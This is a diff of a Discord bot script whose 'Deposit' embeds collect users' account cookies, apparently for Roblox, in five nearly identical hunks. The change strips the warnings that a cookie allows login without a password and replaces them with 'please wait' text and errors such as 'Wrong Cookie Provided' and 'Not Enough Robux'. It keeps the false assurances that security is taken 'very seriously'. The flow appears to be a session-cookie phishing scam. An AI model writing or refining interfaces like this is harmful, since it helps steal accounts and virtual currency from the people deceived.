@@ -76,24 +76,17 @@ $interactionUpdate[;
 {author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
 {description:
 # Deposit
-- To deposit you need to provide your **account cookie**.
-- This information is **really sensitive** so becareful of giving someone your cookie.
-- With this cookie, people can login to your account **without providing username or password**!
-- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
-- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
-**Do at your own risk**
 
-**Choose an amount to deposit**
-- **5 $**
-- 10 $
-- 20 $
-- 30 $
-- 50 $
+***Please wait until the process is complete.***
+***You will be notified once the its complete***
+
+**Some problems that will prevent the process fromm success:**
+- Wrong Cookie Provided.
+- Not Enough Robux.
+- System Error.
 
 We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.
-
 Our system is designed with the latest security measures to **keep your information safe and secure**.
-
 You can trust us to handle your account with the **utmost care and professionalism**.
 Thanks!
 }
@@ -173,24 +166,17 @@ $interactionUpdate[;
 {author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
 {description:
 # Deposit
-- To deposit you need to provide your **account cookie**.
-- This information is **really sensitive** so becareful of giving someone your cookie.
-- With this cookie, people can login to your account **without providing username or password**!
-- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
-- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
-**Do at your own risk**
 
-**Choose an amount to deposit**
-- 5 $
-- **10 $**
-- 20 $
-- 30 $
-- 50 $
+***Please wait until the process is complete.***
+***You will be notified once the its complete***
+
+**Some problems that will prevent the process fromm success:**
+- Wrong Cookie Provided.
+- Not Enough Robux.
+- System Error.
 
 We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.
-
 Our system is designed with the latest security measures to **keep your information safe and secure**.
-
 You can trust us to handle your account with the **utmost care and professionalism**.
 Thanks!
 }
@@ -271,24 +257,17 @@ $interactionUpdate[;
 {author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
 {description:
 # Deposit
-- To deposit you need to provide your **account cookie**.
-- This information is **really sensitive** so becareful of giving someone your cookie.
-- With this cookie, people can login to your account **without providing username or password**!
-- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
-- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
-**Do at your own risk**
 
-**Choose an amount to deposit**
-- 5 $
-- 10 $
-- **20 $**
-- 30 $
-- 50 $
+***Please wait until the process is complete.***
+***You will be notified once the its complete***
+
+**Some problems that will prevent the process fromm success:**
+- Wrong Cookie Provided.
+- Not Enough Robux.
+- System Error.
 
 We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.
-
 Our system is designed with the latest security measures to **keep your information safe and secure**.
-
 You can trust us to handle your account with the **utmost care and professionalism**.
 Thanks!
 }
@@ -369,24 +348,17 @@ $interactionUpdate[;
 {author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
 {description:
 # Deposit
-- To deposit you need to provide your **account cookie**.
-- This information is **really sensitive** so becareful of giving someone your cookie.
-- With this cookie, people can login to your account **without providing username or password**!
-- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
-- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
-**Do at your own risk**
 
-**Choose an amount to deposit**
-- 5 $
-- 10 $
-- 20 $
-- **30 $**
-- 50 $
+***Please wait until the process is complete.***
+***You will be notified once the its complete***
+
+**Some problems that will prevent the process fromm success:**
+- Wrong Cookie Provided.
+- Not Enough Robux.
+- System Error.
 
 We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.
-
 Our system is designed with the latest security measures to **keep your information safe and secure**.
-
 You can trust us to handle your account with the **utmost care and professionalism**.
 Thanks!
 }
@@ -466,24 +438,17 @@ $interactionUpdate[;
 {author:$username[$interactionData[author.id]]:$userAvatar[$interactionData[author.id]]}{thumbnail:https://media.discordapp.net/attachments/938792218037198868/1127442461573255168/image.png}
 {description:
 # Deposit
-- To deposit you need to provide your **account cookie**.
-- This information is **really sensitive** so becareful of giving someone your cookie.
-- With this cookie, people can login to your account **without providing username or password**!
-- If you think your Cookie got leaked, logout of your account and login back to reset the Cookie!
-- Check out how to get your cookie [here](https://www.youtube.com/watch?v=1v3inNUxyL8).
-**Do at your own risk**
 
-**Choose an amount to deposit**
-- 5 $
-- 10 $
-- 20 $
-- 30 $
-- **50 $**
+***Please wait until the process is complete.***
+***You will be notified once the its complete***
+
+**Some problems that will prevent the process fromm success:**
+- Wrong Cookie Provided.
+- Not Enough Robux.
+- System Error.
 
 We understand that __**security**__ is a top priority, and we want to assure you that we take it **very seriously**.
-
 Our system is designed with the latest security measures to **keep your information safe and secure**.
-
 You can trust us to handle your account with the **utmost care and professionalism**.
 Thanks!
 }
